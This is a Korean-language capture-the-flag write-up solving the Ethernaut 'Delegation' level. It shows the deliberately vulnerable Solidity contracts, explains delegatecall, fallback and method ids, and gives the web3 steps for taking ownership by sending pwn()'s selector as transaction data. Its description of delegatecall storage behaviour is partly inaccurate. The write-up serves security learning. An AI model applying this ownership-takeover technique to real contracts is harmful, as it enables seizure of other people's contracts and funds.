# 목표

`Instance`의 `ownership` 가져오기

# 팁

- Solidity의 `delegatecall` 을 알아보자! 작동방식, 다른 라이브러리와 어떻게 연결되는지 등 ..
- `Fallback` 함수를 알아보자!
- `Method id`를 알아보자!

# 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

# 풀이

## Call?

`컨트랙트 A`에서 `컨트랙트 B`로 함수를 호출하는 것. 이때, `msg.sender`는 `컨트랙트A`의 주소가 된다.

## Delegate Call?

`Storage`를 변경시키지 않고 `call`을 수행한다. 즉, `컨트랙트 A`로 전달된 `msg`를 그대로 `컨트랙트 B`로 전달한다. `msg.sender`도 변하지 않는다.

## Fallbak 함수?

컨트랙트로 요청을 보냈을 때, 없는 함수를 호출했거나 이더를 보내면 `fallback` 함수가 `default`로 실행된다.

## Method id?

`함수명(매개변수타입)`을 `sha3` 돌려서 나온 결과값의 앞 `4byte` 부분. 함수의 고유값이 된다.

## 코드 다시보기

### Delegate 컨트랙트

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
```

`pwn()` 함수를 실행시키면 owner를 바꿀수 있는 걸로 추정된다.

### fallback 함수

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```

`delegate 컨트랙트`에 `delegatecall`을 호출하고 있다. 호출하는 함수는 `msg.data`로 받아온다.

### address.delegatecall( function )?

해당 주소의 컨트랙트에서 `function`에 들어간 함수를 실행시킨다. 이때, `function`은 `Method id` 값을 넣는다. 

## 최종 풀이

`fallback` 함수를 통해서 `delegate`의 `pwn()`을 실행시키는 걸 목표로 한다.

이때, `delegatecall`은 `Storage`가 그대로 넘어간다는 점을 통해서 `pwn()`의 `msg.sender`는 `fallback`의 `msg.sender`와 같다는 점을 알 수 있다.

즉, `pwn()`의 `Method id`값을 알아내고, `msg.data`에 담아서 `fallback`을 실행시켜주면 `ownership`을 가져올 수 있다.

### 1. pwn()의 Method id 알아내기

함수의 `Method id`는 `web3` 모듈을 통해서 알아낼 수 있다.

```jsx
web3.eth.abi.encodeFunctionSignature("pwn()")
```

<img width="565" alt="스크린샷 2023-05-03 오후 3 56 56" src="https://github.com/jasper200207/BlockchainSecrutiy_study_2023/assets/51306225/2e5cad32-e215-48ff-88d7-49f7fcecd8f6">


### 2. contract로 transaction 보내기

`sendTransaction`을 통해서 보내자!
이때, 1. 에서 구한 `Method id`를 `data`로 넣어주자!

```jsx
await contract.sendTransaction({data:"0xdd365b8b"})
```

### 3. contract의 owner를 확인해보자

```jsx
(await contract.owner()) === player
```

<img width="563" alt="스크린샷 2023-05-03 오후 4 02 06" src="https://github.com/jasper200207/BlockchainSecrutiy_study_2023/assets/51306225/942c7202-4b63-4313-a654-50ab7fbb558d">
